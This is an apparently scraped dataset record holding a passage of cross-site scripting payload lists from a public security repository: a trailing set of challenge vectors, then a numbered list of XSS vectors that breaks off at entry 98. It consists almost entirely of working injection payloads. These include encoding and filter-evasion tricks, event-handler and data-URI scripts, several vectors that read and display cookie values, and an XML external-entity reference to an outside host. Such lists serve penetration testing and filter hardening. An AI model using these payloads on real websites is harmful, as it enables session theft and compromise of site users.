arguments.callee.caller.arguments.callee;return 'click';});var _alert = alert;alert = function() { alert = _alert };x.apply(null, a);(function() {arguments.__defineGetter__('0', function() { return a.pop(); });alert(get());})();};safe123.click();</script>#\n<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();\n<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>\n<textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href=%26quot;javascript:\\%26quot;%26lt;script%26gt;var%2520xhr%2520%253D%2520new%2520XMLHttpRequest()%253Bxhr.open('GET'%252C%2520'http%253A%252F%252Fhtml5sec.org%252Fxssme2'%252C%2520true)%253Bxhr.onload%2520%253D%2520function()%2520%257B%2520alert(xhr.responseText.match(%252Fcookie%2520%253D%2520'(.*%253F)'%252F)%255B1%255D)%2520%257D%253Bxhr.send()%253B%26lt;\\/script%26gt;\\%26quot;%26quot;) autofocus></textarea>\n<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();\n<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>\n<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe id=iframe src=%22javascript:parent.x(window)%22><iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();\n<textarea id=ta onfocus=%22write('<script>alert(1)</script>')%22 autofocus></textarea>\n<object data=%22data:text/html;base64,PHNjcmlwdD4gdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly94c3NtZS5odG1sNXNlYy5vcmcveHNzbWUyJywgdHJ1ZSk7IHhoci5vbmxvYWQgPSBmdW5jdGlvbigpIHsgYWxlcnQoeGhyLnJlc3BvbnNlVGV4dC5tYXRjaCgvY29va2llID0gJyguKj8pJy8pWzFdKSB9OyB4aHIuc2VuZCgpOyA8L3NjcmlwdD4=%22>\n<script>function x(window) { eval(location.hash.substr(1)) }; open(%22javascript:opener.x(window)%22)</script>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();\n%3Cscript%3Exhr=new%20ActiveXObject%28%22Msxml2.XMLHTTP%22%29;xhr.open%28%22GET%22,%22/xssme2%22,true%29;xhr.onreadystatechange=function%28%29{if%28xhr.readyState==4%26%26xhr.status==200%29{alert%28xhr.responseText.match%28/%27%28[^%27]%2b%29/%29[1]%29}};xhr.send%28%29;%3C/script%3E\n<iframe src=`http://xssme.html5sec.org/?xss=<iframe onload=%22xhr=new XMLHttpRequest();xhr.open('GET','http://html5sec.org/xssme2',true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();%22>`>\n<a target=\"x\" href=\"xssme?xss=%3Cscript%3EaddEventListener%28%22DOMFrameContentLoaded%22,%20function%28e%29%20{e.stopPropagation%28%29;},%20true%29;%3C/script%3E%3Ciframe%20src=%22data:text/html,%253cscript%253eObject.defineProperty%28top,%20%27MyEvent%27,%20{value:%20Object,%20configurable:%20true}%29;function%20y%28%29%20{alert%28top.Safe.get%28%29%29;};event%20=%20new%20Object%28%29;event.type%20=%20%27click%27;event.isTrusted%20=%20true;y%28event%29;%253c/script%253e%22%3E%3C/iframe%3E\n<a target=\"x\" href=\"xssme?xss=<script>var cl=Components;var fcc=String.fromCharCode;doc=cl.lookupMethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupMethod(doc,fcc(119,114,105,116,101))(doc.location.hash)</script>#<iframe src=data:text/html;base64,PHNjcmlwdD5ldmFsKGF0b2IobmFtZSkpPC9zY3JpcHQ%2b name=ZG9jPUNvbXBvbmVudHMubG9va3VwTWV0aG9kKHRvcC50b3AsJ2RvY3VtZW50JykoKTt2YXIgZmlyZU9uVGhpcyA9ICBkb2MuZ2V0RWxlbWVudEJ5SWQoJ3NhZmUxMjMnKTt2YXIgZXZPYmogPSBkb2N1bWVudC5jcmVhdGVFdmVudCgnTW91c2VFdmVudHMnKTtldk9iai5pbml0TW91c2VFdmVudCggJ2NsaWNrJywgdHJ1ZSwgdHJ1ZSwgd2luZG93LCAxLCAxMiwgMzQ1LCA3LCAyMjAsIGZhbHNlLCBmYWxzZSwgdHJ1ZSwgZmFsc2UsIDAsIG51bGwgKTtldk9iai5fX2RlZmluZUdldHRlcl9fKCdpc1RydXN0ZWQnLGZ1bmN0aW9uKCl7cmV0dXJuIHRydWV9KTtmdW5jdGlvbiB4eChjKXtyZXR1cm4gdG9wLlNhZmUuZ2V0KCl9O2FsZXJ0KHh4KGV2T2JqKSk></iframe>\n<a target=\"x\" href=\"xssme?xss=<script>find('cookie'); var doc = getSelection().getRangeAt(0).startContainer.ownerDocument; console.log(doc); var xpe = new XPathEvaluator(); var nsResolver = xpe.createNSResolver(doc); var result = xpe.evaluate('//script/text()', doc, nsResolver, 0, null); alert(result.iterateNext().data.match(/cookie = '(.*?)'/)[1])</script>\n<a target=\"x\" href=\"xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', '.', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();\nGarethy Salty Method!<script>alert(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(this,'window')(),'document')(), 'getElementsByTagName')('html')[0],'innerHTML')().match(/d.*'/));</script>\n<a href=\"javascript&colon;\\u0061&#x6C;&#101%72t&lpar;1&rpar;\"><button>\n<div onmouseover='alert&lpar;1&rpar;'>DIV</div>\n<iframe style=\"position:absolute;top:0;left:0;width:100%;height:100%\" onmouseover=\"prompt(1)\">\n<a href=\"jAvAsCrIpT&colon;alert&lpar;1&rpar;\">X</a>\n<embed src=\"http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf\"> ?\n<object data=\"http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf\">?\n<var onmouseover=\"prompt(1)\">On Mouse Over</var>?\n<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>\n<img src=\"/\" =_=\" title=\"onerror='prompt(1)'\">\n<%<!--'%><script>alert(1);</script -->\n<script src=\"data:text/javascript,alert(1)\"></script>\n<iframe/src \\/\\/onload = prompt(1)\n<iframe/onreadystatechange=alert(1)\n<svg/onload=alert(1)\n<input value=<><iframe/src=javascript:confirm(1)\n<input type=\"text\" value=``<div/onmouseover='alert(1)'>X</div>\nhttp://www.<script>alert(1)</script .com\n<iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ?\n<svg><script ?>alert(1)\n<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>\n<img src=`xx:xx`onerror=alert(1)>\n<object type=\"text/x-scriptlet\" data=\"http://jsfiddle.net/XLE63/ \"></object>\n<meta http-equiv=\"refresh\" content=\"0;javascript&colon;alert(1)\"/>?\n<math><a xlink:href=\"//jsfiddle.net/t846h/\">click\n<embed code=\"http://businessinfo.co.uk/labs/xss/xss.swf\" allowscriptaccess=always>?\n<svg contentScriptType=text/vbs><script>MsgBox+1\n<a href=\"data:text/html;base64_,<svg/onload=\\u0061&#x6C;&#101%72t(1)>\">X</a\n<iframe/onreadystatechange=\\u0061\\u006C\\u0065\\u0072\\u0074('\\u0061') worksinIE>\n<script>~'\\u0061' ;  \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073.  \\u0061\\u006C\\u0065\\u0072\\u0074(~'\\u0061')</script U+\n<script/src=\"data&colon;text%2Fj\\u0061v\\u0061script,\\u0061lert('\\u0061')\"></script a=\\u0061 & /=%2F\n<script/src=data&colon;text/j\\u0061v\\u0061&#115&#99&#114&#105&#112&#116,\\u0061%6C%65%72%74(/XSS/)></script ????????????\n<object data=javascript&colon;\\u0061&#x6C;&#101%72t(1)>\n<script>+-+-1-+-+alert(1)</script>\n<body/onload=&lt;!--&gt;&#10alert(1)>\n<script itworksinallbrowsers>/*<script* */alert(1)</script ?\n<img src ?itworksonchrome?\\/onerror = alert(1)???\n<svg><script>//&NewLine;confirm(1);</script </svg>\n<svg><script onlypossibleinopera:-)> alert(1)\n<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe\n<script x> alert(1) </script 1=2\n<div/onmouseover='alert(1)'> style=\"x:\">\n<--`<img/src=` onerror=alert(1)> --!>\n<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ?\n<div  style=\"position:absolute;top:0;left:0;width:100%;height:100%\"  onmouseover=\"prompt(1)\" onclick=\"alert(1)\">x</button>?\n\"><img src=x onerror=window.open('https://www.google.com/');>\n<form><button formaction=javascript&colon;alert(1)>CLICKME\n<math><a xlink:href=\"//jsfiddle.net/t846h/\">click\n<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>?\n<iframe  src=\"data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\"></iframe>\n<a  href=\"data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203\">Click  Me</a>\n\"><img src=x onerror=prompt(1);>\n", "timestamp": "2025-10-21T13:30:27.940104"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "XSS Injection/Intruders/MarioXSSVectors.txt", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/Intruders/MarioXSSVectors.txt", "content": "<div id=\"1\"><form id=\"test\"></form><button form=\"test\" formaction=\"javascript:alert(1)\">X</button>//[\"'`-->]]>]</div><div id=\"2\"><meta charset=\"x-imap4-modified-utf7\">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi//[\"'`-->]]>]</div><div id=\"3\"><meta charset=\"x-imap4-modified-utf7\">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>//[\"'`-->]]>]</div><div id=\"4\">0?<script>Worker(\"#\").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))//[\"'`-->]]>]</div><div id=\"5\"><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(5)',384,null,'rsa-dual-use')</script>//[\"'`-->]]>]</div><div id=\"6\"><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>//[\"'`-->]]>]</div><div id=\"7\"><input onfocus=alert(7) autofocus>//[\"'`-->]]>]</div><div id=\"8\"><input onblur=alert(8) autofocus><input autofocus>//[\"'`-->]]>]</div><div id=\"9\"><a style=\"-o-link:'javascript:alert(9)';-o-link-source:current\">X</a>//[\"'`-->]]>]</div><div id=\"10\"><video poster=javascript:alert(10)//></video>//[\"'`-->]]>]</div><div id=\"11\"><svg xmlns=\"http://www.w3.org/2000/svg\"><g onload=\"javascript:alert(11)\"></g></svg>//[\"'`-->]]>]</div><div id=\"12\"><body onscroll=alert(12)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>//[\"'`-->]]>]</div><div id=\"13\"><x repeat=\"template\" repeat-start=\"999999\">0<y repeat=\"template\" repeat-start=\"999999\">1</y></x>//[\"'`-->]]>]</div><div id=\"14\"><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>//[\"'`-->]]>]</div><div id=\"15\"><script>({0:#0=alert/#0#/#0#(0)})</script>//[\"'`-->]]>]</div><div id=\"16\">X<x style=`behavior:url(#default#time2)` onbegin=`alert(16)` >//[\"'`-->]]>]</div><div id=\"17\"><?xml-stylesheet href=\"javascript:alert(17)\"?><root/>//[\"'`-->]]>]</div><div id=\"18\"><script xmlns=\"http://www.w3.org/1999/xhtml\">&#x61;l&#x65;rt&#40;1)</script>//[\"'`-->]]>]</div><div id=\"19\"><meta charset=\"x-mac-farsi\">¼script ¾alert(19)//¼/script ¾//[\"'`-->]]>]</div><div id=\"20\"><script>ReferenceError.prototype.__defineGetter__('name', function(){alert(20)}),x</script>//[\"'`-->]]>]</div><div id=\"21\"><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(21)')()</script>//[\"'`-->]]>]</div><div id=\"22\"><input onblur=focus() autofocus><input>//[\"'`-->]]>]</div><div id=\"23\"><form id=test onforminput=alert(23)><input></form><button form=test onformchange=alert(2)>X</button>//[\"'`-->]]>]</div><div id=\"24\">1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=alert(24)&gt;`>//[\"'`-->]]>]</div><div id=\"25\"><script src=\"#\">{alert(25)}</script>;1//[\"'`-->]]>]</div><div id=\"26\">+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);//[\"'`-->]]>]</div><div id=\"27\"><style>p[foo=bar{}*{-o-link:'javascript:alert(27)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>//[\"'`-->]]>]</div>\n<div id=\"28\">1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=alert(28)&gt;>//[\"'`-->]]>]</div>\n<div id=\"29\"><link rel=stylesheet href=data:,*%7bx:expression(alert(29))%7d//[\"'`-->]]>]</div><div id=\"30\"><style>@import \"data:,*%7bx:expression(alert(30))%7D\";</style>//[\"'`-->]]>]</div><div id=\"31\"><frameset onload=alert(31)>//[\"'`-->]]>]</div><div id=\"32\"><table background=\"javascript:alert(32)\"></table>//[\"'`-->]]>]</div><div id=\"33\"><a style=\"pointer-events:none;position:absolute;\"><a style=\"position:absolute;\" onclick=\"alert(33);\">XXX</a></a><a href=\"javascript:alert(2)\">XXX</a>//[\"'`-->]]>]</div><div id=\"34\">1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>//[\"'`-->]]>]</div><div id=\"35\">1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(35) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>//[\"'`-->]]>]</div><div id=\"36\"><a style=\"behavior:url(#default#AnchorClick);\" folder=\"javascript:alert(36)\">XXX</a>//[\"'`-->]]>]</div><div id=\"37\"><!--<img src=\"--><img src=x onerror=alert(37)//\">//[\"'`-->]]>]</div><div id=\"38\"><comment><img src=\"</comment><img src=x onerror=alert(38)//\">//[\"'`-->]]>]</div>\n<div id=\"39\"><!-- up to Opera 11.52, FF 3.6.28 -->\n<![><img src=\"]><img src=x onerror=alert(39)//\">\n\n<!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  -->\n<svg><![CDATA[><image xlink:href=\"]]><img src=xx:x onerror=alert(2)//\"></svg>//[\"'`-->]]>]</div>\n<div id=\"40\"><style><img src=\"</style><img src=x onerror=alert(40)//\">//[\"'`-->]]>]</div>\n<div id=\"41\"><li style=list-style:url() onerror=alert(41)></li>\n<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(41)></div>//[\"'`-->]]>]</div>\n<div id=\"42\"><head><base href=\"javascript://\"/></head><body><a href=\"/. /,alert(42)//#\">XXX</a></body>//[\"'`-->]]>]</div>\n<div id=\"43\"><?xml version=\"1.0\" standalone=\"no\"?>\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\n<head>\n<style type=\"text/css\">\n@font-face {font-family: y; src: url(\"font.svg#x\") format(\"svg\");} body {font: 100px \"y\";}\n</style>\n</head>\n<body>Hello</body>\n</html>//[\"'`-->]]>]</div>\n<div id=\"44\"><style>*[{}@import'test.css?]{color: green;}</style>X//[\"'`-->]]>]</div><div id=\"45\"><div style=\"font-family:'foo[a];color:red;';\">XXX</div>//[\"'`-->]]>]</div><div id=\"46\"><div style=\"font-family:foo}color=red;\">XXX</div>//[\"'`-->]]>]</div><div id=\"47\"><svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(47)</script></svg>//[\"'`-->]]>]</div><div id=\"48\"><SCRIPT FOR=document EVENT=onreadystatechange>alert(48)</SCRIPT>//[\"'`-->]]>]</div><div id=\"49\"><OBJECT CLASSID=\"clsid:333C7BC4-460F-11D0-BC04-0080C7055A83\"><PARAM NAME=\"DataURL\" VALUE=\"javascript:alert(49)\"></OBJECT>//[\"'`-->]]>]</div><div id=\"50\"><object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>//[\"'`-->]]>]</div><div id=\"51\"><embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></embed>//[\"'`-->]]>]</div><div id=\"52\"><x style=\"behavior:url(test.sct)\">//[\"'`-->]]>]</div>\n<div id=\"53\"><xml id=\"xss\" src=\"test.htc\"></xml>\n<label dataformatas=\"html\" datasrc=\"#xss\" datafld=\"payload\"></label>//[\"'`-->]]>]</div>\n<div id=\"54\"><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>//[\"'`-->]]>]</div><div id=\"55\"><video><source onerror=\"alert(55)\">//[\"'`-->]]>]</div><div id=\"56\"><video onerror=\"alert(56)\"><source></source></video>//[\"'`-->]]>]</div><div id=\"57\"><b <script>alert(57)//</script>0</script></b>//[\"'`-->]]>]</div><div id=\"58\"><b><script<b></b><alert(58)</script </b></b>//[\"'`-->]]>]</div><div id=\"59\"><div id=\"div1\"><input value=\"``onmouseover=alert(59)\"></div> <div id=\"div2\"></div><script>document.getElementById(\"div2\").innerHTML = document.getElementById(\"div1\").innerHTML;</script>//[\"'`-->]]>]</div><div id=\"60\"><div style=\"[a]color[b]:[c]red\">XXX</div>//[\"'`-->]]>]</div>\n<div id=\"61\"><div  style=\"\\63&#9\\06f&#10\\0006c&#12\\00006F&#13\\R:\\000072 Ed;color\\0\\bla:yellow\\0\\bla;col\\0\\00 \\&#xA0or:blue;\">XXX</div>//[\"'`-->]]>]</div>\n\n<div id=\"62\"><!-- IE 6-8 -->\n<x '=\"foo\"><x foo='><img src=x onerror=alert(62)//'>\n\n<!-- IE 6-9 -->\n<! '=\"foo\"><x foo='><img src=x onerror=alert(2)//'>\n<? '=\"foo\"><x foo='><img src=x onerror=alert(3)//'>//[\"'`-->]]>]</div>\n\n<div id=\"63\"><embed src=\"javascript:alert(63)\"></embed> // O10.10↓, OM10.0↓, GC6↓, FF\n<img src=\"javascript:alert(2)\">\n<image src=\"javascript:alert(2)\"> // IE6, O10.10↓, OM10.0↓\n<script src=\"javascript:alert(3)\"></script> // IE6, O11.01↓, OM10.1↓//[\"'`-->]]>]</div>\n<div id=\"64\"><!DOCTYPE x[<!ENTITY x SYSTEM \"http://html5sec.org/test.xxe\">]><y>&x;</y>//[\"'`-->]]>]</div><div id=\"65\"><svg onload=\"javascript:alert(65)\" xmlns=\"http://www.w3.org/2000/svg\"></svg>//[\"'`-->]]>]</div>\n<div id=\"66\"><?xml version=\"1.0\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(66)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E\"?>\n<root/>//[\"'`-->]]>]</div>\n\n<div id=\"67\"><!DOCTYPE x [\n    <!ATTLIST img xmlns CDATA \"http://www.w3.org/1999/xhtml\" src CDATA \"xx:x\"\n onerror CDATA \"alert(67)\"\n onload CDATA \"alert(2)\">\n]><img />//[\"'`-->]]>]</div>\n\n<div id=\"68\"><doc xmlns:xlink=\"http://www.w3.org/1999/xlink\" xmlns:html=\"http://www.w3.org/1999/xhtml\">\n    <html:style /><x xlink:href=\"javascript:alert(68)\" xlink:type=\"simple\">XXX</x>\n</doc>//[\"'`-->]]>]</div>\n<div id=\"69\"><card xmlns=\"http://www.wapforum.org/2001/wml\"><onevent type=\"ontimer\"><go href=\"javascript:alert(69)\"/></onevent><timer value=\"1\"/></card>//[\"'`-->]]>]</div><div id=\"70\"><div style=width:1px;filter:glow onfilterchange=alert(70)>x</div>//[\"'`-->]]>]</div><div id=\"71\"><// style=x:expression\\28alert(71)\\29>//[\"'`-->]]>]</div><div id=\"72\"><form><button formaction=\"javascript:alert(72)\">X</button>//[\"'`-->]]>]</div><div id=\"73\"><event-source src=\"event.php\" onload=\"alert(73)\">//[\"'`-->]]>]</div><div id=\"74\"><a href=\"javascript:alert(74)\"><event-source src=\"data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A\" /></a>//[\"'`-->]]>]</div><div id=\"75\"><script<{alert(75)}/></script </>//[\"'`-->]]>]</div><div id=\"76\"><?xml-stylesheet type=\"text/css\"?><!DOCTYPE x SYSTEM \"test.dtd\"><x>&x;</x>//[\"'`-->]]>]</div><div id=\"77\"><?xml-stylesheet type=\"text/css\"?><root style=\"x:expression(alert(77))\"/>//[\"'`-->]]>]</div><div id=\"78\"><?xml-stylesheet type=\"text/xsl\" href=\"#\"?><img xmlns=\"x-schema:test.xdr\"/>//[\"'`-->]]>]</div><div id=\"79\"><object allowscriptaccess=\"always\" data=\"test.swf\"></object>//[\"'`-->]]>]</div><div id=\"80\"><style>*{x:ｅｘｐｒｅｓｓｉｏｎ(alert(80))}</style>//[\"'`-->]]>]</div><div id=\"81\"><x xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:actuate=\"onLoad\" xlink:href=\"javascript:alert(81)\" xlink:type=\"simple\"/>//[\"'`-->]]>]</div><div id=\"82\"><?xml-stylesheet type=\"text/css\" href=\"data:,*%7bx:expression(write(2));%7d\"?>//[\"'`-->]]>]</div>\n<div id=\"83\"><x:template xmlns:x=\"http://www.wapforum.org/2001/wml\"  x:ontimer=\"$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(83)\"><x:timer value=\"1\"/></x:template>//[\"'`-->]]>]</div>\n<div id=\"84\"><x xmlns:ev=\"http://www.w3.org/2001/xml-events\" ev:event=\"load\" ev:handler=\"javascript:alert(84)//#x\"/>//[\"'`-->]]>]</div><div id=\"85\"><x xmlns:ev=\"http://www.w3.org/2001/xml-events\" ev:event=\"load\" ev:handler=\"test.evt#x\"/>//[\"'`-->]]>]</div><div id=\"86\"><body oninput=alert(86)><input autofocus>//[\"'`-->]]>]</div>\n<div id=\"87\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<a xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"javascript:alert(87)\"><rect width=\"1000\" height=\"1000\" fill=\"white\"/></a>\n</svg>//[\"'`-->]]>]</div>\n\n<div id=\"88\"><svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n\n<animation xlink:href=\"javascript:alert(88)\"/>\n<animation xlink:href=\"data:text/xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E\"/>\n\n<image xlink:href=\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E\"/>\n\n<foreignObject xlink:href=\"javascript:alert(88)\"/>\n<foreignObject xlink:href=\"data:text/xml,%3Cscript xmlns='http://www.w3.org/1999/xhtml'%3Ealert(88)%3C/script%3E\"/>\n\n</svg>//[\"'`-->]]>]</div>\n\n<div id=\"89\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<set attributeName=\"onmouseover\" to=\"alert(89)\"/>\n<animate attributeName=\"onunload\" to=\"alert(89)\"/>\n</svg>//[\"'`-->]]>]</div>\n\n<div id=\"90\"><!-- Up to Opera 10.63 -->\n<div style=content:url(test2.svg)></div>\n\n<!-- Up to Opera 11.64 - see link below -->\n\n<!-- Up to Opera 12.x -->\n<div style=\"background:url(test5.svg)\">PRESS ENTER</div>//[\"'`-->]]>]</div>\n\n<div id=\"91\">[A]\n<? foo=\"><script>alert(91)</script>\">\n<! foo=\"><script>alert(91)</script>\">\n</ foo=\"><script>alert(91)</script>\">\n[B]\n<? foo=\"><x foo='?><script>alert(91)</script>'>\">\n[C]\n<! foo=\"[[[x]]\"><x foo=\"]foo><script>alert(91)</script>\">\n[D]\n<% foo><x foo=\"%><script>alert(91)</script>\">//[\"'`-->]]>]</div>\n<div id=\"92\"><div style=\"background:url(http://foo.f/f oo/;color:red/*/foo.jpg);\">X</div>//[\"'`-->]]>]</div><div id=\"93\"><div style=\"list-style:url(http://foo.f)\\20url(javascript:alert(93));\">X</div>//[\"'`-->]]>]</div>\n<div id=\"94\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<handler xmlns:ev=\"http://www.w3.org/2001/xml-events\" ev:event=\"load\">alert(94)</handler>\n</svg>//[\"'`-->]]>]</div>\n\n<div id=\"95\"><svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<feImage>\n<set attributeName=\"xlink:href\" to=\"data:image/svg+xml;charset=utf-8;base64,\nPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D\"/>\n</feImage>\n</svg>//[\"'`-->]]>]</div>\n\n<div id=\"96\"><iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe>\n<iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>//[\"'`-->]]>]</div>\n\n<div id=\"97\"><!-- IE 5-9 -->\n<div id=d><x xmlns=\"><iframe onload=alert(97)\"></div>\n<script>d.innerHTML+='';</script>\n\n<!-- IE 10 in IE5-9 Standards mode -->\n<div id=d><x xmlns='\"><iframe onload=alert(2)//'></div>\n<script>d.innerHTML+='';</script>//[\"'`-->]]>]</div>\n\n<div id=\"98\"><div id=d><div style=\"font-family:'sans\\27\\2F\\2A\\22\\2A\\2F\\3B 